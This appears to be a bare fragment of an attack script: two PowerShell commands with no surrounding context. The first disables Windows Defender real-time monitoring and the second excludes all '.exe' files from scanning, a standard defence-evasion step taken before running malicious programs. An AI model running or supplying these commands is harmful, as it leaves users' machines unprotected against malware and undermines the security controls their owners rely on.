powershell.exe /c Set-MpPreference -DisableRealtimeMonitoring $True
powershell.exe /c Add-MpPreference -ExclusionExtension ".exe"